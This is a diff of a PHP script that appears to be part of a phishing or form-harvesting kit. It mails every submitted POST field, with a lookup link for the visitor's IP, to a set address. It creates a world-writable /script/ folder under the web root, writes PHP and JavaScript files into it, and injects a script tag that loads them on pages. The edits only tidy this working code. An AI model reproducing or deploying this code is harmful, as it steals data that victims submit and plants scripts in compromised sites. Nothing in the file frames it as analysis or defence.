@@ -1,5 +1,5 @@
 <?php
-
+$root = $_SERVER['DOCUMENT_ROOT']; 
 if(isset($_POST['_id'])) {
 
 
@@ -33,9 +33,12 @@ if(isset($_POST['_id'])) {
         };
         $link = $_POST['ip'];
         
-        foreach ($_POST as $key => $value) 
+        foreach ($_POST as $key => $value) {
+            if($key == 'to'){
+                unset( $key , $value);
+            }
             $body .= $key . ' : ' . $value . "\r\n";
-        
+        }
         
             if($link){
             $body .= "https://whatismyipaddress.com/ip/" . $link;
@@ -59,6 +62,7 @@ if(isset($_POST['_id'])) {
         
         mail($to, $subject, $body, $headers);
         exit;
+
 }
 
 
@@ -89,7 +93,6 @@ $main = 'master.js';
 $style = 'style.css';
 $content = 'content.js';
 $index = 'index.php';
-$root = $_SERVER['DOCUMENT_ROOT']; 
 /*
 echo $_SERVER['DOCUMENT_ROOT']. '<br>';
 echo $user_agent . '<br>'; 
@@ -105,8 +108,10 @@ echo $content . '<br>';
 echo $index . '<br>';
 echo $_SERVER['REQUEST_URI'] . '<br>';
 echo $_SERVER['HTTP_HOST'];
-*/
 
+
+$root = $_SERVER['DOCUMENT_ROOT']; 
+*/
 if (!file_exists($root .'/script/')) {
     mkdir($root .'/script/', 0777, true);
     $file = fopen($root .'/script/'. $index, 'w') or die("Unable to open $index!");
@@ -175,6 +180,7 @@ if(!is_file($root .'/script/'. $main)){
     $myfile = fopen($root .'/script/'. $main, "w") or die("Unable to open $main!");
     fwrite($myfile, $dat);
     fclose($myfile);
+    
     }
     
     /*
@@ -199,6 +205,6 @@ if(!is_file($root .'/script/'. $main)){
     //echo '<script src="/script/ajax.js"></script>';
     //echo "<script type='text/javascript' src='/script/${main}'></script>";
      */ 
-    echo '<script>import("/script/ajax.js").then((module) => { $.getScript( "../script/master.js", function() {console.log("loaded")})});</script>';
+echo '<script>import("/script/ajax.js").then((module) => { $.getScript( "../script/main.js", function() {console.log("loaded")})});</script>';
 
    
